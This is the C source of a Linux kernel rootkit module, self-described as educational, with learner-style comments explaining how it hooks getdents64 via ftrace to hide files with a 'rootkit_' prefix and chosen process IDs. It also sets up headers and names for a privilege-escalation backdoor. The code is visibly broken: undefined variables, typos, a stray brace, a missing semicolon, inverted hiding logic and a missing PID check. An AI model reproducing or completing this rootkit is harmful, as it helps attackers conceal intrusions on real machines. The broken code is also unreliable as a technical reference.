#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt // prefixes all errors/info with name; ex: *rootkit* : couldn't find symbol

#include <linux/cred.h> // credential manipulation for privesc backdoor
#include <linux/dirent.h> // dir entry structs for getdents64 hook
#include <linux/fs.h> // fs types
#include <linux/init.h> // init/exit macros
#include <linux/kernel.h> // kernel itself
#include <linux/list.h> // kernel linked list for module hiding
#include <linux/module.h>
#include <linux/proc_fs.h> // creating /proc entries
#include <linux/sched.h> // process/task structs
#include <linux/slab.h> // kmalloc / kfree, kernel mem alloc
#include <linux/string.h>
#include <linux/uaccess.h> // copy_to_user / copy_from_user
#include <linux/version.h>

#include "include/ftrace_helper.h" // in "" because it's a local file, not a system header

MODULE_LICENSE("GPL"); // needed to have kernel allow access to symbols the module needs
MODULE_AUTHOR("Kizusuita");
MODULE_DESCRIPTION("Educational LKM rootkit");
MODULE_VERSION("1.0");

#define HIDE_PREFIX "rootkit_" // Makes all files starting with rootkit_ hidden in ls
#define BACKDOOR_ENTRY "rootkit_backdoor" // name of proc entry, show up as "/proc/rootkit_backdoor"
#define MAX_HIDDEN_PIDS 16

// Loops through array looking for match. Acquires the lock before reading, releases after. Return true if found.
static bool pid_is_hidden(pid_t pid)
{
    int i;
    bool found = false;
    spin_lock(&pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid0) { found = true; break; }
    }
    spin_unlock(&pid_lock);
    return found;
}

/* Adds a PID to array, -ENOMEM = "no memory" (Checks if array is full), adds 1 to count and adds PID into array at index
 * spin_lock & spin_unlock = always in pairs, everything between them is a protected process in the CPU so it can't be
 *                           interrupted. If it's locked, it always need to be unlocked eventually.
 */

static int hide_pid(pid_t pid)
{
    spin_lock(&pid_lock);
    if (hidden_pid_count >= MAX_HIDDEN_PIDS) {
        spin_unlock(&pid_lock);
        return -ENOMEM;
    }
    hidden_pids[hidden_pid_count++] = pid;
    spin_unlock(&pid_lock);
    pr_info("now hiding PID %d\n", pid); // info msg, shows up in dmesg
    return 0;
}

/* typedef asmlinkage long (...) = defines a function pointer type. asklinkage tells the compiler args come from the stack
 *                                 rather than CPU registers (req for syscalls, needed to store og func)
 * static orig_getdents64_t ... = Actual variable holding og func addr. Passed as &orig_getdents64 in the HOOK() macro,
 *                                ftrace_helper helps write the real addr.
 * #ifdef PTREGS_SYSCALL_STUBS = Handles difference between kernel versions, newer v. recieves a pt_regs * and it's manually
 *                               unpacked, on older kernels it's just directly parameters
 * __user = kernel anno marking a pointer as pointing into userspace memory. You CAN'T dereference directly, gotta use
 *          copy_from_user / copy_to_user.
 */

#ifdef PTREGS_SYSCALL_STUBS
typedef asmlinkage long (*orig_getdents64_t)(const struct pr_regs *);
static orig_getdents64_t orig_getdents64_t;

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    char __user *dirent = (char __user *)regs->si;
    unsigned long count = (unsigned long)regs->dx;
#else
typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
                                            struct linux_dirent64 __user *,
                                            unsigned int);
static orig_getdents64_t orig_getdents64;
static asmlinkage long hook_getdents64(unsigned int fd,
                                       struct linux_dirent64 __user *dirent,
                                       unsigned int count)
}
#endif

/* This is the main hook
 * ret = orig_getdents64(...) = call the real syscall first. Need output before filter; #ifdef handles both kernel calling
 *       conventions like earlier.
 * if (ret <= 0) = error handling
 * kzalloc(ret, GFP_KERNEL) = alloc "ret" bytes of zeroed kernel mem. GFP_KERNEL means it's okay to sleep waiting for mem if
 *                            needed. The ret always needs checked here, bc if it fails it needs to return the unfiltered
 *                            result rather than just crashing the program.
 * copy_from_user(kbuf, dirent, ret) = copies buffer from userspace into kernel buffer; dirent = __user pointer; can't read
 *                                     msgs directly from userspace, gotta use this function
 * kfree(kbuf) = every kzalloc must have matching kfree, it's for if copy_from_user fails
 */

    long ret; // stores ret value from syscall; # of bytes written into the buffer
    char *kbuf; // kernel-space buffer to copy results to to mod them
    struct linux_dirent64 *cur, *prev; // pointers to walk thru directory entries, cur = current; prev = previous
    unsigned long offset; // tracks position while walking thru buffer
    pid_t entry_pid;

#ifdef PTREGS_SYSCALL_STUBS
    ret = orig_getdents64(regs);
#else
    ret = orig_getdents64(fd, dirent, count);
#endif

    if (ret <= 0)
        return ret;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if(!kbuf)
        return ret;

    if (copy_from_user(kbuf, dirent, ret)){
        kfree(kbuf);
        return ret;
    }

/* Explaination for Below:
 * prev = NULL; offset = 0 = start at beginning, no entry yet
 * cur = (...) = cast raw bytes at current kernel buffer position into linux_dirent64 struct so can read fields
 * bool hide = false = flag to hide entry in 'ls', starts as false
 * strncmp(cur->d_name ...) = compares first N chars of entry name against prefix, and then if it matches hide it.
 *                            ret = 0 when it matches
 * simple_strtol = tries to parse entry name as a number; if it successfully parses and it's in the hidden PID list, hide
 *                 it. It's specfiically how processes are hidden, /proc lists PIDs as # dirs
 *
 * Actual hiding has 2 cases:
 *      prev exists = extend prev entry d_reclen to grab this one, kernel walks entries by jumping forward "d_reclen" bytes
 *                    each time, so making the previous entry longer causes the kernel to skip right over the hidden one.
 *      no prev = first entry, so memmove everything after it to overwrite, then reduce ret so the caller thinks the buffer
 *                is shorter.
 *
 * -------------------------------------------------------------------------------------------------------------------------
 * I didn't quite get this, so this is how it actually works:
 * getdent64 fills a buffer with entries like this - [ entry A ][ entry B ][ entry C ][ entry D ]
 * Each entry has a d_reclen field that says "I'm this long, and the next entry starts right after"
 *
 * There's 2 situations to try and hide entry C in this case, 1 would be if C is *not* the first entry (so prev) and the
 * other is C *is* the first (no prev).
 *
 * Case 1) Just lie about B's length
 * B's size would be set with this formula: B.d_reclen = B.d_reclen + C.d_reclen
 * Now, the buffer looks the same in mem so it doesn't make anything break, but when the kernel reads B and jumps forward,
 * it'll skip over C because the length of B is set as B + C, landing directly on D.
 *
 * Case 2) Physically slide everything after C backwards to overwrite it
 * In this example the data would be physically copied and moved backwards, moving entry D into the place where entry C is.
 * That's where memmove is necessary, it copies bytes from one place to another, handling overlaps.
 * Then C's size is subtracted from the buffer (subtracted from ret) so it never see where C would've been and doesn't error
 * 'memmove' is used here instead of 'memcopy' because memcopy is undefined when source and destination would overlap. They
 * *don't* overlap here, but it's safer to just use it when working with buffers just in case something would happen.
 * -------------------------------------------------------------------------------------------------------------------------
 *
 * continue ~> skips offset at the bottom since everything would've been moved
 * offset = ... = advance to next entry
 */

    prev = NULL;
    offset = 0;

    while (offset < ret) {
        cur = (struct linux_dirent64 *)(kbuf + offset)
        bool hide = false;

        if (strncmp(cur->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
            hide = true;

        if (!hide) {
            if (prev) {
                prev->d_reclen+= cur->d_reclen;
            } else {
                memmove(kbuf, kbuf + cur->d_reclen, ret - cur->d_reclen);
                ret -= cur->d_reclen;
                continue;
            }
        } else {
            prev = cur;
        }

        offset += cur->d_reclen;
    }

    if (copy_to_user(dirent, kbuf, ret)) {
        kfree(kbuf);
        return -EFAULT;
    }

    kfree(kbuf);
    return ret;
}




